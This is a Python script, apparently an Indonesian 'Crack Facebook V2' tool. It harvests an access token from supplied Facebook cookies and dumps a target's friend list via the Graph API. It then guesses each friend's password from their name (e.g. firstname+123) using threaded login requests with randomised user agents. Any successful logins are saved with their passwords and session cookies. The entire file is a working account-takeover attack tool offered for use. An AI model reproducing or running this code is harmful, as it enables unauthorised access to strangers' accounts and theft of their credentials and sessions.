M = '\x1b[1;91m'
O = '\x1b[1;96m'
N = '\x1b[0m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'

import requests, sys, os, json, re, random, datetime, rich, time, platform
from concurrent.futures import ThreadPoolExecutor as REKODPUH

ses = requests.Session()
rg = random.randrange
rr = random.randint
rc = random.choice

loop,ok,cp = 0,0,0
dump,method,id2,id,tokenku = [],[],[],[],[]

try:
	proxz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(proxz)
except Exception as e:
	print(' Jaringan Anda Bermasalah ')
proxz = open('proxy.txt','r').read().splitlines()

# DISINI BAE GANTI UANYA
def usErAgent():
	ver_andro = f"{str(rg(2,8))}.{str(rg(0,4))}.{str(rg(0,4))}"
	bahasa = rc(["en-gb", "en-us", "fi-fi", "id-id", "ru-ru", "it-it", "fr-fr"])
	GT = rc(["GT-I9505 Build/JDQ39", "GT-N8013 Build/JZO54K", "GT-N5110 Build/JDQ39","GT-I9100 Build/000000","GT-I9305 Build/KTU84P"])
	ugengt = f"Mozilla/5.0 (Linux; U; Android {ver_andro}; {bahasa}; {GT}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"
	uaku = rc([ugengt])
	return uaku

def HapusCok():
	os.system('rm .token.txt');os.system('rm .cookies.txt');exit()

def ClearTermux():
	os.system('clear')
	print(CUMABANER)

def back():
	MainPerintah()

CUMABANER = f"""{M}>{K}>{H}>{N} [ {H}Crack Facebook V2{N} ] {M}<{K}<{H}<{N}"""

klender = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = klender[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
lives = 'LIVE-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
checks = 'CHECK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cookies.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			Main()
		except KeyError:
			login_cok()
		except requests.exceptions.ConnectionError:
			print(' jaringan bermasalah cuy ')
			exit()
	except IOError:
		login_cok()

def login_cok():
	ClearTermux()
	cok = input(f'{M}>{K}>{H}>{N} Masukan Cookies Disini Cuy : ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers = head, cookies = {"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'{M}>{K}>{H}>{N} Login Gagal Cuy, Ganti Cookies ');time.sleep(2);exit()
		else:
			for JK in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={JK}&nav_source=no_referrer", headers = head, cookies = {"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cookies.txt', 'a').write(cok)
				print(f'\n{M}>{K}>{H}>{N} Token Lu Cuy : {took} ');exit()
	except Exception as e:
		print(e)

def MainPerintah():
	try:
		token = open('.token.txt','r').read();cok = open('.cookies.txt','r').read()
	except IOError:print(f'{M}>{K}>{H}>{N} Cookies Kedaluwarsa Cuy');login_cok()
	ClearTermux()
	print(f'[{H}1{N}] Crack Publik\n[{H}2{N}] Log Out')
	_JANGAN_JUAL_ = input(f'{M}>{K}>{H}>{N} Pilih Menu Cuy : ')
	if _JANGAN_JUAL_ in ['1','01']:
		idt = input(f'\n{M}>{K}>{H}>{N} Masukan ID Target Cuy : ')
		dump(idt,"",{"cookie":cok},token)
		setting_id()
	elif _JANGAN_JUAL_ in ['2','02']:
		HapusCok()
	else:
		print(f'{M}>{K}>{H}>{N} Pilih Yang Bener Cuy')

def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

def setting_id():
	for buat_random in id:
		idd_random = rr(0,len(id2))
		id2.insert(idd_random,buat_random)
	wordlistpass()

def wordlistpass():
	print(f'\n{M}>{K}>{H}>{N} Total ID {H}{len(id)}{N} {M}<{K}<{H}<{N}')
	print(f'{M}>{K}>{H}>{N} Mainkan Mode Pesawat Setiap {H}433 ID{N} {M}<{K}<{H}<{N}\n')
	with REKODPUH(max_workers=30) as pool:
		for tobatcuy in id2:
			idf,nmf = tobatcuy.split('|')[0],tobatcuy.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'123456')
					pwv.append(frs+'0'+str(rr(0,9)))
					pwv.append(frs+'1'+str(rr(0,9)))
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'123456')
					pwv.append(frs+'0'+str(rr(0,9)))
					pwv.append(frs+'1'+str(rr(0,9)))
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)					
			else:
				pool.submit(crack,idf,pwv)

def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{N}[{H}{idf}{N}] {loop} | {H}Live:-{ok}{N} | {K}Check :-{cp}{N} "),sys.stdout.flush()
	url = rc(["m.prod.facebook.com", "m.alpha.facebook.com", "mbasic.prod.facebook.com", "d.facebook.com"])
	ua = usErAgent()
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://'+url+'/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2F'+url+'%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad5b1170-376c-46b5-9400-05c86b297d44%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = ({
			"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"uid":idf,
			"next": "https://"+url+"/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
			"flow":"login_no_pin",
			"pass":pw,
			})
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			headers = ({
			'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'dpr': '2',
			'viewport-width': f'{str(rr(300,999))}',
			'sec-ch-ua': f'"Not)A;Brand";v="{str(rg(8,24))}", "Chromium";v="{str(rg(80,120))}"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': f'"{str(rg(2,14))}.0.0"',
			'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rg(8,24))}.0.0.0", "Chromium";v="{str(rg(80,120))}.0.{str(rr(4200,5700))}.{str(rg(40,150))}"',
			'sec-ch-prefers-color-scheme': 'dark',
			'referer': 'https://'+url+'/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2F'+url+'%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad5b1170-376c-46b5-9400-05c86b297d44%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			})
			po = ses.post('https://'+url+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data, headers=headers, cookies={'cookie': koki}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}[OK] {H}{idf}|{pw}{N}')
				open('LIVE/'+lives,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f'\r{N}[CP] {K}{idf}|{pw}{N}')
				open('CHECK/'+checks,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(33)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('LIVE')
	except:pass
	try:os.mkdir('CHECK')
	except:pass
	try:os.system('clear')
	except:pass
	MainPerintah()